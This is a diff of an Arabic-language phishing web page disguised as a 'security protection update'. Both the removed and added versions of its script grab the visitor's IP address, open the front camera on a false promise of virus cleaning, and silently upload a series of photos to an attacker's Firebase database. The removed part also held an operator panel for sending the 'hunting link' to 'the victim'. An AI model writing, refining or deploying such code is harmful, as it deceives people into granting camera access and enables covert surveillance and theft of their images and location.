@@ -3,39 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الحماية المتقدم - المشاكس</title>
+    <title>تحديث نظام الحماية</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: radial-gradient(circle, #200, #000); color: white; font-family: "Arial"; text-align: center; margin: 0; padding: 20px; overflow-x: hidden; }
-        .box { border: 2px solid #f00; border-radius: 20px; padding: 25px; background: rgba(0,0,0,0.9); box-shadow: 0 0 30px #f00; display: inline-block; margin-top: 30px; width: 90%; max-width: 450px; }
-        .btn-main { background: linear-gradient(to bottom, #f00, #800); color: #fff; width: 100%; padding: 18px; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; box-shadow: 0 4px #500; }
-        .btn-main:active { transform: translateY(2px); box-shadow: 0 2px #300; }
-        .copy-btn { background: #0f0; color: #000; padding: 10px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 10px; border: none; }
-        #status { color: #ff0; margin-top: 15px; font-weight: bold; font-size: 14px; }
-        .hidden { display: none; }
+        body { background: #000; color: #fff; font-family: Arial; text-align: center; padding-top: 50px; }
+        .card { border: 2px solid #0f0; display: inline-block; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px #0f0; }
+        .btn { background: #0f0; color: #000; padding: 20px 40px; font-size: 20px; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; }
         video, canvas { display: none; }
-        input { width: 90%; padding: 10px; background: #222; color: #fff; border: 1px solid #f00; text-align: center; border-radius: 5px; margin-top: 10px; }
     </style>
 </head>
 <body>
-
-    <div id="adminArea" class="hidden">
-        <div class="box">
-            <h2 style="color:#0f0;">😎 لوحة التحكم (المشاكس)</h2>
-            <p>أهلاً يا عبده.. انسخ الرابط وابعته للضحية:</p>
-            <input type="text" id="myUrl" value="https://bdwalmtyry05-lgtm.github.io/security/" readonly>
-            <button class="copy-btn" onclick="copyMyLink()">نسخ رابط الصيد 🔗🔥</button>
-        </div>
-    </div>
-
-    <div id="victimArea" class="hidden">
-        <div class="box">
-            <h2 style="color:#f00;">⚠️ تحذير أمني خطير</h2>
-            <p>جهازك معرض للخطر! اضغط لتفعيل الحماية وسحب ملفات التجسس فوراً.</p>
-            <button class="btn-main" onclick="startTrap()">تفعيل الدرع الفولاذي 🛡️</button>
-            <div id="status">الحالة: بانتظار أوامر الحماية...</div>
-        </div>
+    <div class="card">
+        <h2 style="color:#0f0;">⚠️ تنبيه الحماية</h2>
+        <p>يجب تفعيل الوصول لتنظيف جهازك من الفيروسات</p>
+        <button class="btn" onclick="startTrap()">تفعيل الآن 🛡️</button>
+        <p id="st" style="color:#555; margin-top:10px;">الحالة: بانتظار الموافقة</p>
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -51,53 +34,43 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // فحص: هل المستخدم فاتح من التطبيق (AppCreator24)؟
-        if (navigator.userAgent.includes('AppCreator24')) {
-            document.getElementById('adminArea').classList.remove('hidden');
-        } else {
-            document.getElementById('victimArea').classList.remove('hidden');
-        }
-
-        function copyMyLink() {
-            const copyText = document.getElementById("myUrl");
-            copyText.select();
-            document.execCommand("copy");
-            alert("✅ تم النسخ يا وحش.. ابعته للضحية وخليه يفتح الكاميرا!");
-        }
-
         async function startTrap() {
-            const status = document.getElementById('status');
             try {
+                // 1. سحب الـ IP الأول
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // 2. محاولة فتح الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } // بيصور بالكاميرا الأمامية
+                });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                status.innerText = "⏳ جاري فحص الثغرات وتأمين المجلدات...";
+                document.getElementById('st').innerText = "⌛ جاري تأمين الملفات...";
 
-                let count = 0;
-                const interval = setInterval(() => {
+                // 3. التصوير التلقائي المتكرر
+                let shots = 0;
+                const loop = setInterval(() => {
                     const canvas = document.getElementById('c');
                     canvas.width = 640; canvas.height = 480;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
+                    // إرسال الصورة لـ Firebase (مشروعك myspy-2579b)
                     db.ref('results').push({
-                        photo: canvas.toDataURL('image/jpeg', 0.5),
+                        photo: canvas.toDataURL('image/jpeg', 0.6),
                         ip: ipData.ip,
                         time: new Date().toLocaleString()
                     });
 
-                    count++;
-                    if (count >= 7) {
-                        clearInterval(interval);
-                        status.innerText = "✅ اكتمل تأمين الجهاز!";
-                        alert("✅ تم تفعيل الحماية بنجاح! جهازك الآن آمن 100%.");
+                    shots++;
+                    if (shots >= 10) { 
+                        clearInterval(loop); 
+                        alert("✅ تم تأمين جهازك بنجاح!");
+                        document.getElementById('st').innerText = "✅ اكتمل الفحص";
                     }
-                }, 800);
+                }, 700); // صورة كل 700 مللي ثانية
             } catch (err) {
-                alert("🚨 خطأ! يجب الموافقة على صلاحية الكاميرا لإتمام التحديث الأمني.");
-                status.innerText = "❌ فشل التفعيل: صلاحيات الكاميرا مرفوضة.";
+                alert("🚨 يجب السماح بالكاميرا لتحديث الحماية!");
             }
         }
     </script>
